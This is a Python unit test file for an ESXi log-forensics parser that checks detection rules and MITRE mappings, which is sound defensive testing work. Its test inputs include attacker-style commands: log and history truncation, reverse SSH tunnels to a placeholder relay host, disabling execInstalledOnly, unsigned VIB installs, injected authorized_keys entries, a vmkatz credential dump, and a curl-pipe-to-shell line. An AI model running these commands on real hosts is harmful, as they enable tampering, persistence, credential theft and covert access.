from __future__ import annotations

import base64
import json
import sqlite3
import tempfile
import unittest
from pathlib import Path

from uac_parser.enrich.attack_phases import enrich_attack_phases
from uac_parser.enrich.ttp_rules import enrich_events
from uac_parser.loaders.uac_layout import discover_sources
from uac_parser.parsers import esxi, sqlite_log
from uac_parser.parsers.esxi_activity import key_fingerprints


class EsxiInvestigationTests(unittest.TestCase):
    def test_timestamp_period_keeps_original_evidence(self):
        raw = "2022-05-20T11:15:57.540Z. In(14) shell[42]: [root]: whoami"
        event = self.parse("shell.log", [raw])[0]
        self.assertEqual(event.timestamp, "2022-05-20T11:15:57.540000Z")
        self.assertEqual(event.timezone_confidence, "explicit_utc")
        self.assertEqual(event.raw, raw)

    def parse(self, name: str, records: list[str], host: str = "lab-esx"):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / name
            path.write_text("\n".join(records), encoding="utf-8")
            return esxi.parse(path, f"bundle/var/run/log/{name}", host=host)

    def commands(self, commands: list[str]):
        return self.parse(
            "shell.log",
            [
                f"2026-01-02T01:{i:02d}:00.000Z In(14) shell[42]: [root]: {command}"
                for i, command in enumerate(commands)
            ],
        )

    def test_linux_auth_log_is_not_misclassified_as_esxi(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "var/log").mkdir(parents=True)
            (root / "var/log/auth.log").write_text(
                "Jan 2 01:00:00 linux sshd[1]: test\n"
            )
            sources = discover_sources(root)
        self.assertEqual([s.source_type for s in sources], ["auth_log"])

    def test_transfer_tool_alone_is_not_cloud_exfiltration(self):
        events = self.commands(
            [
                "sftp root@198.51.100.20",
                "scp /tmp/example root@198.51.100.20:/tmp/",
                "rsync -a /tmp/example /tmp/backup",
            ]
        )
        enrich_attack_phases(enrich_events(events))
        for event in events:
            self.assertIn("exfil_tool_usage", event.detection_names)
            self.assertNotIn("cloud_storage_exfiltration", event.detection_names)
            self.assertNotIn("T1567.002", event.mitre)
            self.assertNotIn("T1048", event.mitre)
            self.assertIn("T1048", event.mitre_candidates)

    def test_auth_method_and_ipv6_preserved_without_claiming_lateral_movement(self):
        events = self.parse(
            "syslog.log",
            [
                "2026-01-02T01:00:00Z In(38) sshd-session[5]: Accepted keyboard-interactive/pam for root from 2001:db8::2 port 50100 ssh2"
            ],
        )
        enrich_attack_phases(enrich_events(events))
        self.assertEqual(events[0].src_ip, "2001:db8::2")
        self.assertEqual(
            events[0].extra["authentication_method"], "keyboard-interactive/pam"
        )
        self.assertIn("T1021.004", events[0].mitre_candidates)
        self.assertNotIn("lateral_movement", events[0].attack_phases)

    def test_sftp_accounting_and_bounded_cross_rotation_session_context(self):
        events = self.parse(
            "syslog.1",
            [
                "2026-01-02T01:00:00Z In(174) sftp-server[8]: session opened for local user root from [198.51.100.20]"
            ],
        ) + self.parse(
            "syslog.log",
            [
                '2026-01-02T01:01:00Z In(174) sftp-server[8]: open "/vmfs/volumes/demo/vm/disk.vmdk" flags READ mode 0666',
                '2026-01-02T01:02:00Z In(174) sftp-server[8]: close "/vmfs/volumes/demo/vm/disk.vmdk" bytes read 1024 written 0',
                "2026-01-02T01:03:00Z In(174) sftp-server[8]: session closed for local user root from [198.51.100.20]",
                '2026-01-02T01:04:00Z In(174) sftp-server[8]: opendir "/vmfs"',
            ],
        )
        other = self.parse(
            "syslog.log",
            ['2026-01-02T01:01:00Z In(174) sftp-server[8]: opendir "/vmfs"'],
            host="other-host",
        )
        enrich_events(events + other)
        self.assertEqual(events[2].src_ip, "198.51.100.20")
        self.assertEqual(events[2].extra["bytes_read"], 1024)
        self.assertEqual(
            events[2].extra["session_context"]["source_path"],
            "bundle/var/run/log/syslog.1",
        )
        self.assertIsNone(events[4].src_ip)
        self.assertIsNone(other[0].src_ip)
        self.assertFalse(
            any("T1048" in technique for e in events for technique in e.mitre)
        )

    def test_session_pid_expiry_prevents_stale_attribution(self):
        events = self.parse(
            "syslog.log",
            [
                "2026-01-02T01:00:00Z In(174) sftp-server[8]: session opened for local user root from [198.51.100.20]",
                '2026-01-04T01:00:00Z In(174) sftp-server[8]: opendir "/vmfs"',
            ],
        )
        enrich_events(events)
        self.assertIsNone(events[1].src_ip)

    def test_vmkatz_attempt_not_credential_recovery_and_cwd_is_candidate(self):
        events = self.commands(
            [
                "cd '/vmfs/volumes/demo/guest alpha'",
                "./vmkatz memory.vmem",
                "python vmkatz_loader.py vmkatz memory.vmem",
                "grep vmkatz shell.log",
                "cat vmkatz_loader.py",
            ]
        )
        enrich_attack_phases(enrich_events(events))
        for event in events[1:3]:
            self.assertIn("esxi_credential_dump_attempt", event.detection_names)
            self.assertIn("T1003", event.mitre)
            self.assertIn("credential_access", event.attack_phases)
            self.assertIn("unproven", event.extra["outcome"])
            self.assertEqual(
                event.extra["working_directory_candidate"],
                "/vmfs/volumes/demo/guest alpha",
            )
        for event in events[3:]:
            self.assertNotIn("esxi_credential_dump_attempt", event.detection_names)

    def test_arbitrary_script_name_is_flagged_without_guessing_ransomware(self):
        events = self.commands(
            ["python arbitrary-job.py -p '/vmfs/volumes/demo/guest alpha'"]
        )
        enrich_events(events)
        self.assertIn("esxi_datastore_script_execution", events[0].detection_names)
        self.assertNotIn("T1486", events[0].mitre)
        self.assertEqual(
            events[0].extra["datastore_targets"], ["/vmfs/volumes/demo/guest alpha"]
        )

    def test_key_fingerprint_uses_blob_not_comment_and_read_is_not_write(self):
        fields = [b"ssh-ed25519", bytes(range(32))]
        blob = b"".join(len(x).to_bytes(4, "big") + x for x in fields)
        key = "ssh-ed25519 " + base64.b64encode(blob).decode()
        commands = [
            f"echo '{key} lab@one' >> /etc/ssh/keys-root/authorized_keys",
            f"echo '{key} different-comment' >> /etc/ssh/keys-root/authorized_keys",
            "cp /etc/ssh/keys-root/authorized_keys /tmp/key-backup",
            "grep 'echo key >> authorized_keys' /var/run/log/shell.log",
        ]
        events = enrich_events(self.commands(commands))
        self.assertEqual(
            events[0].extra["ssh_key_fingerprints"],
            events[1].extra["ssh_key_fingerprints"],
        )
        self.assertEqual(len(events[0].extra["ssh_key_fingerprints"]), 1)
        for event in events[2:]:
            self.assertNotIn("esxi_ssh_key_modified", event.detection_names)
        self.assertEqual(key_fingerprints("ssh-rsa " + "A" * 100), [])

    def test_log_truncation_tunnel_and_control_changes(self):
        events = enrich_events(
            self.commands(
                [
                    "> /.ash_history",
                    "> /var/run/log/auth.log",
                    "ssh -NT -R 8080:localhost:22 lab@relay.example.invalid",
                    "esxcli system settings kernel set -s execInstalledOnly -v FALSE",
                    "esxcli system settings kernel set -s execInstalledOnly -v TRUE",
                    "esxcli software vib install --no-sig-check -v /tmp/lab.vib",
                ]
            )
        )
        self.assertIn("esxi_log_history_tampering", events[0].detection_names)
        self.assertIn("esxi_log_history_tampering", events[1].detection_names)
        self.assertIn("reverse_shell_or_tunnel_pattern", events[2].detection_names)
        self.assertIn("esxi_exec_installed_only_disabled", events[3].detection_names)
        self.assertNotIn("esxi_exec_installed_only_disabled", events[4].detection_names)
        self.assertIn("esxi_vib_validation_bypass", events[5].detection_names)

    def test_nohup_wrapped_reverse_ssh_is_detected(self):
        events = enrich_events(
            self.commands(
                [
                    "nohup ssh -o ServerAliveInterval=60 -N -R lab:22:localhost:22 user@relay.example.invalid &"
                ]
            )
        )
        self.assertIn("reverse_shell_or_tunnel_pattern", events[0].detection_names)
        self.assertEqual(events[0].extra["execution_wrapper"], "nohup")

    def test_failed_account_change_keeps_outcome_and_session_reference(self):
        prefix = "2026-01-02T01:00:00Z In(166) Hostd[9]: "
        events = self.parse(
            "hostd.log",
            [
                prefix
                + "[Originator@6876 sub=Vimsvc sid=abc] Event 1 : User root@198.51.100.20 logged in as browser",
                prefix.replace("01:00", "01:01")
                + "[Originator@6876 sub=Vimsvc sid=abc user=root] Task Completed : haTask-vim.host.LocalAccountManager.changePassword-7 Status error",
            ],
        )
        enrich_events(events)
        self.assertEqual(events[1].src_ip, "198.51.100.20")
        self.assertEqual(events[1].extra["outcome"], "error")
        self.assertIn("esxi_account_management", events[1].detection_names)

    def test_lockout_has_no_invented_source_and_session_is_not_auth_success(self):
        events = self.parse(
            "vobd.log",
            [
                "2026-01-02T01:00:00Z In(14) vobd[9]: [vob.user.account.locked] Remote access for ESXi local user account 'root' has been locked for 900 seconds after 6 failed login attempts.",
                "2026-01-02T01:01:00Z In(14) vobd[9]: [esx.audit.ssh.session.opened] SSH session was opened for 'root@198.51.100.20'.",
            ],
        )
        self.assertIsNone(events[0].src_ip)
        self.assertEqual(events[0].extra["reported_failed_attempts"], 6)
        self.assertEqual(events[1].event_action, "esxi_ssh_session_opened")
        self.assertEqual(events[1].extra["authentication_method"], "not_recorded")

    def test_power_off_and_unregister_do_not_receive_unrelated_attack_techniques(self):
        events = self.parse(
            "hostd.log",
            [
                "2026-01-02T01:00:00Z In(166) Hostd[9]: Task Completed : haTask-42-vim.VirtualMachine.powerOff Status success",
                "2026-01-02T01:01:00Z In(166) Hostd[9]: Task Completed : haTask-42-vim.VirtualMachine.unregister Status success",
            ],
        )
        enrich_events(events)
        self.assertEqual(events[0].mitre, ["T1489"])
        self.assertEqual(events[1].mitre, [])

    def test_proxy_success_is_not_proof_of_completed_datastore_transfer(self):
        events = self.parse(
            "envoy-access.log",
            [
                '2026-01-02T01:00:00Z In(166) envoy-access[9]: GET /folder/lab.vmdk 200 via_upstream - 0 10 - 1 1 0 198.51.100.20:3000 HTTP/1.1 - 127.0.0.1:80 - "Download"'
            ],
        )
        self.assertEqual(events[0].extra["http_status"], 200)
        self.assertIsNone(events[0].src_ip)
        self.assertEqual(events[0].mitre, [])

    def test_proxy_compression_names_are_not_archive_tool_execution(self):
        events = self.parse(
            "envoy-access.log",
            [
                '2026-01-02T01:00:00Z In(166) envoy-access[9]: GET /host/logs 404 via_upstream - "gzip tar curl"'
            ],
        )
        enrich_events(events)
        self.assertEqual(events[0].detection_names, [])
        self.assertEqual(events[0].mitre, [])
        self.assertEqual(events[0].mitre_candidates, [])

    def test_read_only_checks_and_quoted_commands_are_not_attack_execution(self):
        events = enrich_events(
            self.commands(
                [
                    "esxcfg-advcfg -g /User/execInstalledOnly | grep false",
                    "echo 'vim-cmd vmsvc/power.off 42'",
                    "grep 'curl https://example.invalid | sh' shell.log",
                ]
            )
        )
        self.assertNotIn("esxi_exec_installed_only_disabled", events[0].detection_names)
        self.assertNotIn("esxi_destructive_vm_operation", events[1].detection_names)
        self.assertNotIn("download_execute_chain", events[2].detection_names)

    def test_zero_hit_source_has_coverage_and_polling_is_filtered(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "hostd.log"
            path.write_text(
                "2026-01-02T01:00:00Z In(166) Hostd[9]: Task Created : haTask-vim.vslm.host.CatalogSyncManager.queryCatalogChange-1\n"
            )
            coverage = {}
            events = esxi.parse(path, "var/run/log/hostd.log", coverage=coverage)
        self.assertEqual(events, [])
        self.assertEqual(coverage["filtered_timestamped_records"], 1)
        self.assertFalse(coverage["truncated"])

    def test_configstore_date_metadata_does_not_export_credentials(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "current-store-1"
            with sqlite3.connect(path) as database:
                database.execute(
                    "CREATE TABLE Config (Component, ConfigGroup, Name, Identifier, VitalValue)"
                )
                database.execute(
                    "INSERT INTO Config VALUES (?, ?, ?, ?, ?)",
                    (
                        "esx",
                        "authentication",
                        "user_accounts",
                        "labadmin",
                        json.dumps(
                            {
                                "last_password_change": 20000,
                                "password": "synthetic-secret-not-for-export",
                            }
                        ),
                    ),
                )
            events = sqlite_log.parse(
                path, "var/lib/vmware/configstore/current-store-1"
            )
        event = next(
            e for e in events if e.event_action == "esxi_password_change_date_observed"
        )
        self.assertEqual(event.timestamp_precision, "day")
        self.assertEqual(event.extra["last_password_change_date"], "2024-10-04")
        self.assertNotIn("synthetic-secret", json.dumps([e.to_dict() for e in events]))

    def test_parse_coverage_exposes_unparsed_and_filtered_lines(self):
        events = self.parse(
            "hostd.log",
            [
                "2026-01-02T01:00:00Z In(166) Hostd[9]: Task Created : haTask-vim.VirtualMachine.powerOff-1",
                "2026-01-02T01:01:00Z In(166) Hostd[9]: Routine polling",
                "not a supported timestamp",
            ],
        )
        coverage = events[0].extra["source_parse_coverage"]
        self.assertEqual(coverage["lines_examined"], 3)
        self.assertEqual(coverage["unparsed_lines"], 1)
        self.assertEqual(coverage["filtered_timestamped_records"], 1)


if __name__ == "__main__":
    unittest.main()
